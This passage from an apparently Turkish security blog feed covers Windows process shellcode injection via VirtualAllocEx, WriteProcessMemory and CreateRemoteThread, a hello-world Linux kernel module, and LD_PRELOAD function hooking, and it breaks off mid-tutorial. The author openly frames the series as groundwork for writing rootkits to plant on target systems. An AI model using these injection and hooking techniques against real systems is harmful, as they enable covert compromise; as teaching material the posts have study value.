&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Fonksiyon&lt;/strong&gt;‘nun ne işe yaradığını açıklamak ile uğraşmayacağım ama ben merak ettim diyen varsa aşşağıya bu fonksiyonun windows tarafından açıklandığı dökümantasyonunu bırakıyorum :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HANDLE&lt;/strong&gt;‘mizi oluşturup içerisine &lt;strong&gt;OpenProcess&lt;/strong&gt;‘e 3. parametre olarak &lt;strong&gt;Inject&lt;/strong&gt; olmak istediğimiz &lt;strong&gt;Process PID&lt;/strong&gt;‘sini verip &lt;strong&gt;process&lt;/strong&gt;‘imizi açıyoruz.&lt;/p&gt;

&lt;p&gt;Bundan sonra &lt;strong&gt;VirtualAllocEx&lt;/strong&gt; fonksiyonunu kullanarak oluşturduğumuz &lt;strong&gt;shellcode&lt;/strong&gt;‘un boyutu kadar &lt;strong&gt;process&lt;/strong&gt; içerisinde alan ayırıyoruz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; PVOID joinprocess = VirtualAllocEx(processwithpid, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;VirtualAllocEx&lt;/strong&gt;‘in nasıl kullanıldığına ve parametrelerinin neler olduğuna bakmak isteyen olursa buradan ulaşabilir &lt;strong&gt;windows&lt;/strong&gt; tarafından oluşturulmuş &lt;strong&gt;dökümantasyonuna&lt;/strong&gt;  :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex&quot;&gt;VirtualAllocEx Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Şimdi sıra geldi bu &lt;strong&gt;process&lt;/strong&gt; içerisinde oluşturduğumuz &lt;strong&gt;alan&lt;/strong&gt;‘ın içerisine bizim &lt;strong&gt;shellcode&lt;/strong&gt;‘umuzu yazmaya yani &lt;strong&gt;Inject&lt;/strong&gt; etmeye :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; WriteProcessMemory(processwithpid, joinprocess, shellcode, sizeof shellcode, NULL);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bunuda &lt;strong&gt;WriteProcessMemory&lt;/strong&gt; ile yapabiliyoruz. &lt;strong&gt;Windows&lt;/strong&gt; tarafından oluşturulmuş &lt;strong&gt;dökümantasyonuna&lt;/strong&gt; ulaşmak için :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;WriteProcessMemory Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Şimdi bir &lt;strong&gt;thread&lt;/strong&gt; oluşturup tüm bu yukarıda gerçekleştirdiğimiz işlemleri gerçekleştirmeye geldi sıra :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; HANDLE threadhandler = CreateRemoteThread(processwithpid, NULL, 0, (LPTHREAD_START_ROUTINE)joinprocess, NULL, 0, NULL);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bunuda &lt;strong&gt;CreateRemoteThread&lt;/strong&gt; fonksiyonu ile yapabiliyoruz onunda &lt;strong&gt;windows&lt;/strong&gt; tarafından oluşturulmuş &lt;strong&gt;dökümantasyonuna&lt;/strong&gt; buradan ulaşabilirsiniz :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot;&gt;CreateRemoteThread Win API&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ve son olarak bu thread’i kapamaya geldi sıra :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CloseHandle(processwithpid);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yukarıda ki tüm kodların birleşimine buradan ulaşıp derleyebilirsiniz : &lt;a href=&quot;https://pastebin.com/1gPb1PAM&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;# Demo&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Derledikten&lt;/strong&gt; sonra nasıl çalışıp &lt;strong&gt;putty&lt;/strong&gt; içerisine &lt;strong&gt;shellcode&lt;/strong&gt; &lt;strong&gt;injection&lt;/strong&gt; ettiğimizi gösteren küçük bir gizli youtube videosu :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/oaNvWM9k84g&quot;&gt;Demo Video&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Yazı hakkında aklınızda soru işareti varsa twitter hesabım : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Process Shellcode Injection</summary></entry><entry><title type="html">Loadable Kernel Module Development</title><link href="http://192.168.254.251:4000/2019/04/22/loadable-kernel-module.html" rel="alternate" type="text/html" title="Loadable Kernel Module Development" /><published>2019-04-22T00:00:00+03:00</published><updated>2019-04-22T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/22/loadable-kernel-module</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/22/loadable-kernel-module.html">&lt;h1 id=&quot;loadable-kernel-module-lkm&quot;&gt;Loadable Kernel Module (LKM)&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar. &lt;strong&gt;Loadable Kernel Module (LKM)&lt;/strong&gt; yazıma hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu yazımda sizlere &lt;strong&gt;Yüklenebilir Çekirdek Modülünün&lt;/strong&gt; yani &lt;strong&gt;LKM&lt;/strong&gt;‘nin geliştirilmesinden bahsedeceğim. Dürüst olursam benim bu, önceki ve ilerideki gelecek yazılarımdan bahsetmiş ve bahsedecek olma sebebim rootkit geliştirebilesiniz diye ama insanlık adına kullanacağım diyen olursa oda kabulumdur.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt; rootkit geliştirilmesinin en basit yoludur ayrıca bu karşısında basitçe savunma kurabileceğiniz bir yoldur. İşletim sisteminde bir kere root alındıktan sonra rootkit bu yetkiyi kontrol etmenin en iyi yoludur. Bunuda ek bilgi olarak verdiğime göre artık yazımıza geçip &lt;strong&gt;LKM&lt;/strong&gt;‘nin nasıl yazıldığından bahsedelim.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘yi &lt;strong&gt;kernel&lt;/strong&gt; yani &lt;strong&gt;çekirdek&lt;/strong&gt; için bir eklenti olarak düşünebiliriz ayrıca &lt;strong&gt;LKM&lt;/strong&gt; size bulunduğunuz yetkiler ile &lt;strong&gt;kernel&lt;/strong&gt; içerisinde kod çalıştırmanızı sağlar. &lt;strong&gt;LKM&lt;/strong&gt; az çok kafanızda bunun ne olduğu canlandıysa devam edelim.&lt;/p&gt;

&lt;h1 id=&quot;i̇lk-yüklenebilir-çekirdek-modülümüz&quot;&gt;İlk Yüklenebilir Çekirdek Modülümüz&lt;/h1&gt;
&lt;p&gt;Bu modülü yazmadan önce bize kütüphanelerimiz gerek her programda olduğu gibi :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/init.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu kısımdan sonra bu modül hakkında bilgileri verdiğimiz kısım geliyor :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MODULE_AUTHOR(&quot;blacknbunny&quot;);
MODULE_DESCRIPTION(&quot;Basit Merhaba Dunya Modulu&quot;);
MODULE_LICENSE(&quot;GPL&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modülü kimin yazdığı, modül hakkında açıklama ve lisans yer alıyor bu kısımda.&lt;/p&gt;

&lt;p&gt;Bu kısmıda anladığımıza göre biraz daha teknik bölüm olan yükleme kısmına gelelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int __init merhaba_init(void)
{
  printk(&quot;Merhaba Dünya!\n&quot;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Bu kısımda modülümüz kernel’e yüklendikten sonra çalışma aşamasında ne yapacağını belirliyor.&lt;/p&gt;

&lt;p&gt;Fonksiyon tipimizi ve return tipini belirledikten sonra burada karşımıza çıkan farklı bir fonksiyon var oda &lt;strong&gt;printk&lt;/strong&gt; fonksiyonu.&lt;/p&gt;

&lt;p&gt;Bu fonksiyon adındanda anlaşılabileceği gibi kernel içerisinde yazdırma yapan bir fonksiyon bu. Daha da detaylı incelemek istiyorum diyen varsa aranızda buyurun &lt;a href=&quot;https://en.wikipedia.org/wiki/Printk&quot;&gt;Wikipedia printk&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Kernel içerisinde modülümüz aracılığı ile “Merhaba Dünya” yazdırdık fakat her girişin bir çıkışıda vardır &lt;strong&gt;I/O&lt;/strong&gt; mantığı gibi düşünün. Günün sonunda bunu nasıl kernel içerisine install edeceğimizi göreceğin &lt;strong&gt;insmod&lt;/strong&gt; komutu ile yalnız bunu birde kernelin içinden çıkarmak var bunuda &lt;strong&gt;rmmod&lt;/strong&gt; ile yapabiliyoruz.&lt;/p&gt;

&lt;p&gt;Rootkitimizi karşıdaki sisteme yükleyip uçup kaçtıktan sonra bu rootkit modülünü sistemden çıkartmamız gerekebilir. O zamanda rootkit içerisinde bir çıkış fonksiyonunun bulunması gerekebilir tabi bu basit bir &lt;strong&gt;LKM&lt;/strong&gt; olduğundan detaya girmiyorum.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void __exit merhaba_exit(void)
{
  printk(&quot;Hello world kernelden cikartiliyor.\n&quot;);
  return;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu şekilde de modülümüzü kernel içerisinden &lt;strong&gt;Unload&lt;/strong&gt; edebiliyoruz. Şimdi geldi son kodumuza tüm bu &lt;strong&gt;__init&lt;/strong&gt; ve &lt;strong&gt;__exit&lt;/strong&gt; fonksiyonlarını modül içine yüklemeye :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;module_init(merhaba_init);
module_exit(merhaba_exit);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve &lt;strong&gt;module_init&lt;/strong&gt; ile yüklenmenin &lt;strong&gt;module_exit&lt;/strong&gt; ilede çıkarılmanın gerçekleştiğini görebiliyoruz.&lt;/p&gt;

&lt;p&gt;Şimdi geriye kalan tüm bu kodu birleştirip bir adet &lt;strong&gt;Makefile&lt;/strong&gt; dosyası oluşturup &lt;strong&gt;make&lt;/strong&gt; komutu ile derlemek.&lt;/p&gt;

&lt;p&gt;Alttaki &lt;strong&gt;LKM&lt;/strong&gt;‘yi &lt;strong&gt;merhaba.c&lt;/strong&gt; olarak kaydettiğinizi varsayıyorum.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/init.h&amp;gt;

MODULE_AUTHOR(&quot;blacknbunny&quot;);
MODULE_DESCRIPTION(&quot;Basit Merhaba Dunya Modulu&quot;);
MODULE_LICENSE(&quot;GPL&quot;);

static int __init merhaba_init(void)
{
  printk(&quot;Merhaba Dünya!\n&quot;);
  return 0;
}

static void __exit merhaba_exit(void)
{
  printk(&quot;Hello world kernelden cikartiliyor.\n&quot;);
  return;
}

module_init(merhaba_init);
module_exit(merhaba_exit);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;make-ile-lkm-derlenmesi&quot;&gt;Make ile LKM derlenmesi&lt;/h1&gt;
&lt;p&gt;Bu modülü derlemek içinde komut satırımızdan yada bir pad ile &lt;strong&gt;Makefile&lt;/strong&gt; adında bir dosya oluşturup içine eklememiz lazım.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += merhaba.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Derlemeyi gerçekleştirmek için alttaki komut satırında gerçekleştirdiğim komutları kullanabilirsiniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ ls
Makefile  merhaba.c
remnux@remnux:~/heyhey$ make
make -C /lib/modules/3.13.0-53-generic/build M=/home/remnux/heyhey modules
make[1]: Entering directory `/usr/src/linux-headers-3.13.0-53-generic'
  CC [M]  /home/remnux/heyhey/merhaba.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/remnux/heyhey/merhaba.mod.o
  LD [M]  /home/remnux/heyhey/merhaba.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.13.0-53-generic'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;make&lt;/strong&gt; komutu sonrasında tekrar &lt;strong&gt;ls&lt;/strong&gt; komutunu çalıştırdığımızda klasörümüzdeki dosya sayısının arttığını görebiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ ls
Makefile   merhaba.ko     merhaba.mod.o  modules.order
merhaba.c  merhaba.mod.c  merhaba.o      Module.symvers
remnux@remnux:~/heyhey$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu dosyaların arasından bizim modülümüz &lt;strong&gt;merhaba.ko&lt;/strong&gt;. Bu modülü kernel içerisine &lt;strong&gt;load&lt;/strong&gt; edebilmemiz yani yükleyebilmemiz için başta da bahsettiğimiz &lt;strong&gt;insmod&lt;/strong&gt; komutunu kullanmamız gerekli.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ insmod ./merhaba.ko
insmod: ERROR: could not insert module ./merhaba.ko: Operation not permitted
remnux@remnux:~/heyhey$ sudo insmod ./merhaba.ko
remnux@remnux:~/heyhey$ dmesg | tail -n 1
[ 6350.260783] Merhaba D\xffffffc3\xffffffbc\xffffffbcnya!
remnux@remnux:~/heyhey$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;insmod&lt;/strong&gt; ile bunu kernele yükleyip &lt;strong&gt;dmesg&lt;/strong&gt; ile incelediğimizde kernelde bize gelen &lt;strong&gt;Merhaba Dünya&lt;/strong&gt; çıktısını görebiliriz. Yalnız kernel içerisinde türkçe karakter kullanımı mevcut olmadığından ve size bunuda ek olarak göstermek istediğimden çıktıyı &lt;strong&gt;hex code&lt;/strong&gt;‘ları ile almış bulunuyoruz.&lt;/p&gt;

&lt;p&gt;Modülümüzün sağlıklı şekilde çalıştığını gözlemledik ve eğer bu modülü silmek istiyorsak &lt;strong&gt;rmmod&lt;/strong&gt; komutunu kullanabiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ sudo rmmod merhaba
remnux@remnux:~/heyhey$ dmesg | tail -n 1
[ 6593.845495] Hello world kernelden cikartiliyor.
remnux@remnux:~/heyhey$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve çıkartılma sonucunda bizim modülümüz içerisinde belirlediğimiz &lt;strong&gt;__exit&lt;/strong&gt; fonksiyonu çalıştı.&lt;/p&gt;

&lt;p&gt;Eğer modülleri listelemek istiyorsanız &lt;strong&gt;lsmod&lt;/strong&gt; komutunu kullanabilirsiniz örneğin :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/heyhey$ lsmod | grep merhaba
merhaba                12427  0 
remnux@remnux:~/heyhey$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu yazımızda basit bir şekilde &lt;strong&gt;LKM&lt;/strong&gt; yani &lt;strong&gt;Yüklenebilir Çekirdek Modülünü&lt;/strong&gt; en basit şeklinde geliştirmeyi öğrendik.&lt;/p&gt;

&lt;p&gt;Bir daha ki yazımda büyük ihtimal &lt;strong&gt;sys_call_table hijacking&lt;/strong&gt; anlatacağım.&lt;/p&gt;

&lt;p&gt;Sonra ki yazılarda da artık bir rootkit yazarız diye düşünüyorum. Kendinize iyi bakın görüşmek dileği ile !&lt;/p&gt;</content><author><name></name></author><summary type="html">Loadable Kernel Module (LKM)</summary></entry><entry><title type="html">Linux Function Hooking</title><link href="http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking.html" rel="alternate" type="text/html" title="Linux Function Hooking" /><published>2019-04-14T00:00:00+03:00</published><updated>2019-04-14T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking.html">&lt;h1 id=&quot;linux-load-time-function-hooking&quot;&gt;Linux Load-Time Function Hooking&lt;/h1&gt;

&lt;p&gt;Uzun bir süreden sonra bloguma yazı yazıyorum. 2019’un ilk blog yazısı olacak umarım yazıyı beğenirsiniz.&lt;/p&gt;

&lt;p&gt;Öncelikle işi fazla komplekste itmeden size başlıktaki bazı terimleri açıklayarak başlamak istiyorum.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;strong&gt;Load-Time : Bir yazılım çalışmaya başlamadan önce bir yüklenme zamanı vardır. Program tam olarak çalışabilir hale gelene kadar gereksinimlerini kendine yükler örneğin (Libraries, Memory Regions)&lt;/strong&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;strong&gt;Function Hooking : Yazılım içerisinde verilen bir fonksiyonu sahte bir fonksiyonla değiştirmek, düzenlemek.&lt;/strong&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Anlamakta biraz zorlandıysanız hiç problem değil ileri de bu terimleri daha da detaylı inceleyeceğiz.
&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;bir-yazılımın-kullandığı-syscalları-görmek&quot;&gt;Bir yazılımın kullandığı syscalları görmek&lt;/h1&gt;
&lt;p&gt;Yazılım içerisinde kullanılan sistem çağrılarını(syscalls) görmek için linuxta çoğunluk tarafından kullanılan &lt;strong&gt;strace&lt;/strong&gt; binarysini kullanabilirsiniz.
&lt;strong&gt;strace&lt;/strong&gt; çalıştıktan sonra örnek bir çıktı :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ strace ./ornek
execve(&quot;./ornek&quot;, [&quot;./ornek&quot;], [/* 53 vars */]) = 0
brk(0)                                  = 0x61f000
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786da4000
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=108273, ...}) = 0
mmap(NULL, 108273, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f8786d89000
close(3)                                = 0
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&amp;gt;\0\1\0\0\0\320\37\2\0\0\0\0\0&quot;..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1840928, ...}) = 0
mmap(NULL, 3949248, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f87867bf000
mprotect(0x7f878697a000, 2093056, PROT_NONE) = 0
mmap(0x7f8786b79000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7f8786b79000
mmap(0x7f8786b7f000, 17088, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f8786b7f000
close(3)                                = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786d88000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786d86000
arch_prctl(ARCH_SET_FS, 0x7f8786d86740) = 0
mprotect(0x7f8786b79000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7f8786da6000, 4096, PROT_READ) = 0
munmap(0x7f8786d89000, 108273)          = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f8786da3000
write(1, &quot;Hello world !\n&quot;, 14Hello world !
)         = 14
exit_group(14)                          = ?
+++ exited with 14 +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;başlangıç&quot;&gt;Başlangıç&lt;/h1&gt;

&lt;p&gt;Şimdi linuxu açıp aşşağıda bulunan kodu derlediğimizi var sayıyorum :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

  puts(&quot;Hello world !&quot;);

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Derleme : &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc ornek.c -o ornek&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Şimdi bizim yapacağımız şey bu &lt;strong&gt;puts&lt;/strong&gt; fonksiyonunu çalışma &lt;strong&gt;zamanında(load-time)&lt;/strong&gt; verdiğimiz sahte &lt;strong&gt;puts&lt;/strong&gt; ile değiştirmek. Böylelikle programda yazan &lt;strong&gt;fonksiyon&lt;/strong&gt; değil bizim yazdığımız &lt;strong&gt;fonksiyon&lt;/strong&gt; çalışıcak.&lt;/p&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;fonksiyonu-hook-etmek-için-gerekli-kütüphanenin-yazılması&quot;&gt;Fonksiyonu hook etmek için gerekli kütüphanenin yazılması&lt;/h1&gt;
&lt;p&gt;Kütüphanelerimizi ekleyerek başlayalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;dlfcn.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sonra hangi fonksiyonu hooklayacağımızı belirleyelim :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int puts(const char *message) {


}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Burada verilen fonksiyon ve parametreler çok önemli hook edeceğiniz fonksiyonun parametresini ve tipini vermemiz gerek.&lt;/p&gt;

&lt;p&gt;Sonrasında orjinal fonksiyonun sahtesini oluşturmamız gerekiyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int (*new_puts)(const char *message);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve meşhur &lt;strong&gt;dlsym&lt;/strong&gt; fonksiyonuna geldik. Başta eklediğim &lt;strong&gt;dlfcn.h&lt;/strong&gt; library’sinden gelen bu küçük ama işlevi  &lt;strong&gt;Function hooking’de&lt;/strong&gt; çok büyük olan bu fonksiyonu anlatmaya başlayalım&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new_puts = dlsym(RTLD_NEXT, &quot;puts&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Bu fonksiyon iki adet argüman alıyor. Bunlardan ilki olan &lt;strong&gt;RTLD_NEXT&lt;/strong&gt; enum’u &lt;strong&gt;dynamic loader API&lt;/strong&gt; kısmına 2. argüman ile bağlantılı bir sonraki örneğe dönmesini söylüyor. Son argüman ise dönülecek örneğin ismini istiyor ve buda bizim yerine sahtesini koyacağımız &lt;strong&gt;puts&lt;/strong&gt; fonksiyonu.&lt;/p&gt;

&lt;p&gt;Ve son olarak :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;return new_puts(&quot;Hooked Message&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;İle kütüphanemizi yazıyoruz ve &lt;strong&gt;libornek.c&lt;/strong&gt; adıyla kaydediyoruz. Şimdi sıra geldi bu kütüphaneyi oyunda asıl yeri alan &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine(enviroment variable) atamaya.&lt;/p&gt;

&lt;p&gt;Ondan öncesinde tüm bu kütüphanenin bütün kodlarını isteyen olursa : &lt;a href=&quot;https://pastebin.com/RwB0RzXm&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Burada ki pastebin linkinden ulaşabilir bu yukarıda anlatılan tüm kodların birleşimine.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;kütüphanenin-derlenmesi-ve-ld_preloada-aktarılması&quot;&gt;Kütüphanenin derlenmesi ve LD_PRELOAD’a aktarılması&lt;/h1&gt;

&lt;p&gt;Temiz bir şekilde derlemek için alttaki gcc parametreleriyle beraber kullanmamız gerekiyor.&lt;/p&gt;

